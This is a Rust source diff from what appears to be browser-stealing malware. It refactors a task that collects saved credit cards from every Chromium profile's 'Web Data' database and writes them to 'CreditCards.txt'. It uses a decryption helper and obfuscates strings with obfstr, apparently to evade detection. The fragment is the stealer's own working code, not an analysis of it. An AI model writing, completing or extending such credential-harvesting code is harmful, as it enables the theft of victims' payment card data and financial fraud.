@@ -2,7 +2,6 @@ use crate::alloc::borrow::ToOwned;
 use crate::chromium::{decrypt_data, BrowserData};
 use crate::{collect_and_read_sqlite_from_all_profiles, to_string_and_write_all, CreditCard};
 use alloc::sync::Arc;
-use collector::atomic::AtomicCollector;
 use collector::{Browser, Collector};
 use database::TableRecord;
 use obfstr::obfstr as s;
@@ -25,10 +24,10 @@ impl CreditCardsTask {
     }
 }
 
-impl Task for CreditCardsTask {
+impl<C: Collector> Task<C> for CreditCardsTask {
     parent_name!("CreditCards.txt");
 
-    unsafe fn run(&self, parent: &Path, collector: &AtomicCollector) {
+    unsafe fn run(&self, parent: &Path, collector: &C) {
         let Some(mut credit_cards) = collect_and_read_sqlite_from_all_profiles(
             &self.browser.profiles,
             |profile| profile / s!("Web Data"),
